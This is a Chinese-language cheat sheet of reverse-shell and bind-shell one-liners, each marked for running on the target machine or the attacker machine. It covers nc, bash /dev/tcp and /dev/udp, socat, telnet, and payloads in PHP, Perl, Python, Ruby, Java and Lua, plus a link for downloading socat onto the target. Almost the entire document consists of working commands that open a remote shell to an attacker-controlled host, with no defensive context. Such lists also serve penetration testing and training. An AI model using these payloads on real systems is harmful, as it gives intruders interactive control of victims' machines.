1、NC

1.1、NC reverse shell

1.1.1、-e参数（目标机器上执行）

nc  《attack_ip》 《attack_port》 -e /bin/bash

1.1.2、没有-e参数（目标机器上执行）

[1]/bin/sh | nc 《attack_ip》 《attack_port》
[2] rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 《attack_ip》 《attack_port》 > /tmp/f   ###OpenBsd
[3]nc -c bash 《attack_ip》 《attack_port》

nc -lvvp attack_port ###攻击机上执行

1.2、NC Bind shell

nc -lvvp 4444 -e /bin/bash  ###目标机器上执行
nc victim_ip 4444    ###攻击机器执行

2.BASH

2.1、bash tcp

bash -i>＆/dev/tcp/《attack_ip》/《attack_port》 0>＆1  ###目标机器上执行
nc -lvvp attack_port   ###攻击机上执行

2.2、bash udp

目标机器上执行： 

bash -i >& /dev/udp/《attack_ip》/《attack_port》 0>&1  ###目标机器上执行
nc -u -lvp 《aattack_port》  ####攻击机上执行

同样可以尝试其他类型shell：sh, ash, bsh, csh, ksh, zsh, pdksh, tcsh, bash

3、Socat

socat file:`tty`,raw,echo=0 TCP-L:《attack_port》  ####攻击机上执行
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:《attack_ip》:《attack_port》 ###目标机器上执行

有些机器没有socat，需下载到目标机器：https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat

4、Telnet

目标机器：

telnet 《attack_ip》80 | /bin/bash | telnet 192.168.2.6 443

攻击机：

nc -lv 80
nc -lv 443

常见语言环境反弹shell

PHP

[1]php -r '$sock=fsockopen("《attack_ip》",《attack_port》);exec("/bin/sh -i <&3 >&3 2>&3");'
[2]php -r '$sock=fsockopen("《attack_ip》",《attack_port》);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'

Perl

perl -e 'use Socket;$i="《attack_ip》";$p=《attack_port》;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

Python

python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("《attack_ip》",《attack_port》));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'

Ruby

ruby -rsocket -e'f=TCPSocket.open("《attack_ip》",《attack_port》).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

JAVA

r = Runtime.getRuntime() 
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/《attack_ip》/《attack_port》;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[]) 
p.waitFor()

Lua

lua -e "require('socket');require('os');t=socket.tcp();t:connect('《attack_ip》','《attack_port》');os.execute('/bin/sh -i <&3 >&3 2>&3');"
